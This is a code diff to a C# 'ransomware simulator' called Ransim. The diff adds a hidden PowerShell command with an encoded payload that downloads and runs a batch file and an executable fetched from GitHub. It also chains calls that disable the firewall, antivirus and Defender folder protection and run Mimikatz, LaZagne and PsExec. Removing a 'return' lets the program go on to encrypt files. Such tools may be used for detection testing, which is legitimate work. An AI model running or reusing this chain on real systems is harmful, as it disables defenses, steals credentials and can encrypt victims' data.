@@ -2,8 +2,6 @@
 # Title:        Ransim
 # Author:       d4rk-d4nph3
 # Description:  Ransomware Simulator
-# Version:      0.1
-# Released at:  2020/07/05
 # Version:      0.2 (Dev)
 # Released at:  xxxx/xx/xx
 ########################################################################################*/
@@ -194,6 +192,10 @@ namespace Ransim
             Process.Start("powershell.exe", "-command Set-MpPreference -EnableControlledFolderAccess Disabled");
         }
 
+        static void SimulateCobaltStrike()
+        {
+            Process.Start("powershell.exe", "-nop -exec bypass -win hid -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwB2ADAALgAyAC8AVABvAG8AbABzAC8AYwBvAGIAYQBsAHQAcwB0AHIAaQBrAGUALQBzAGkAbQB1AGwAYQB0AG8AcgAuAGIAYQB0ACAALQBPAHUAdAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAYwBzAC0AcwBpAG0AdQBsAGEAdABvAHIALgBiAGEAdAA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwByAGEAdwAvAHYAMAAuADIALwBUAG8AbwBsAHMALwBDAHIAZQBhAHQAZQBOAGEAbQBlAGQAUABpAHAAZQAuAGUAeABlACAALQBPAHUAdAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAQwByAGUAYQB0AGUATgBhAG0AZQBkAFAAaQBwAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAbQBkAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAvAGMAIAAkAGUAbgB2ADoAdABlAG0AcABcAGMAcwAtAHMAaQBtAHUAbABhAHQAbwByAC4AYgBhAHQAIgAgAC0ATgBvAE4AZQB3AFcAaQBuAGQAbwB3AA==");
+        }
         static void RunRecon()
         {
             // Runs a barrage of reconnaissance commands
@@ -287,25 +289,22 @@ namespace Ransim
 
             //Run Location Check
             LocationCheck();
-
             RunRecon();
+            DisableFirewall();
             RunADFind();
             RunSeatbelt();
+            RunPowerView();
             RunPsExec();
             DisableAV();
             RunLaZagne();
             RunMimikatz();
-
-            DisableFirewall();
+            SimulateCobaltStrike();
 
             // Runs a barrage of Registry manipulations commands
             ManipulateRegistry();
 
             StopServices();
 
-            RunPowerView();
-
-            return;
             Console.WriteLine("Starting encryption process");
             // Iterate over files in the target directory for encryption.
             foreach (string file in files)
